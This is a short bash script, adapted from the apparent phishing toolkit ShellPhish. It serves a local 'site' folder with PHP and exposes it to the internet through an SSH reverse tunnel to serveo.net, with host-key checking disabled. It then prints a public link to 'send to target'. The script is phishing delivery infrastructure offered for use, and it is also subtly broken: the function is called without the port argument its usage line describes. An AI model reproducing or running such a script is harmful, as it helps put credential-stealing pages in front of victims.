#!/bin/bash
# Serveo PHP server v0.1
# Modified function from ShellPhish
# Creates a PHP server that runs through Serveo.
# Usage: serveserveo.sh 8088 (to run a local server on port 8088)

serveserveo() {
printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd site && php -S 127.0.0.1:$1 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$1' serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 10
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
printf "\n"
}
serveserveo
